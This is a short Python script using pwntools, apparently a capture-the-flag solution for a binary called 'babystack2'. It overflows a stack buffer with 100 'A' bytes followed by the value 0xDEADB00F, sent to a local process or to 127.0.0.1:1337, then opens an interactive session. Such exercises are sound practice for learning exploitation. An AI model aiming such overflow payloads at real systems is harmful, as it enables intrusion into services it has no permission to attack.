#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys, struct


if len(sys.argv) == 1:
    r = process("./babystack2")
else:
    r = remote("127.0.0.1", 1337)


def main():
    # structtt = struct.pack("<Q", 0xDEADB00F)
    payload = 0xDEADB00F
    r.sendline(b"A" * 100 + p32(payload))
    r.interactive()


if __name__ == "__main__":
    main()
